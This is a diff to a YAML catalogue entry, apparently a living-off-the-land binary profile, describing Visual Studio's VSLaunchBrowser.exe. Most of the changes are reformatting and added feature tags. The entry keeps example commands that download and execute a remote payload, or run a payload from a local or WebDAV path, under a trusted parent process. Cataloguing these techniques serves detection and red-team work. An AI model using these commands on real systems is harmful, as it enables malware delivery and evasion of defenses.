@@ -2,7 +2,9 @@
 id: windows-execution-vslaunchbrowser
 namespace: windows:execution:vslaunchbrowser
 name: vslaunchbrowser
-description: 'Microsoft Visual Studio browser launcher tool for web applications debugging Located at: C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe; C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe.'
+description: 'Microsoft Visual Studio browser launcher tool for web applications debugging
+  Located at: C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe;
+  C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe.'
 author: Avihay Eldad
 version: 1.0.0
 capabilities:
@@ -43,7 +45,12 @@ resource_profile:
 allowed-tools:
 - vslaunchbrowser
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdin
+- pipes-stdout
 execution:
   template: vslaunchbrowser
   sandbox: execFile
@@ -51,11 +58,17 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Download and execute payload from remote server (It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.)
+- description: Download and execute payload from remote server (It will download a
+    remote file to INetCache and open it using the default app associated with the
+    supplied file extension with VSLaunchBrowser as parent process.)
   command: VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
-- description: Execute payload via VSLaunchBrowser as parent process (It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.)
+- description: Execute payload via VSLaunchBrowser as parent process (It will open
+    a local file using the default app associated with the supplied file extension
+    with VSLaunchBrowser as parent process.)
   command: VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}
-- description: Execute payload from WebDAV server via VSLaunchBrowser as parent process (It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.)
+- description: Execute payload from WebDAV server via VSLaunchBrowser as parent process
+    (It will open a remote file using the default app associated with the supplied
+    file extension with VSLaunchBrowser as parent process.)
   command: VSLaunchBrowser.exe .exe {PATH_SMB}
 references: []
 techniques:
@@ -78,7 +91,6 @@ install:
   commands:
   - choco install vslaunchbrowser
 ---
-
 
 # vslaunchbrowser
 
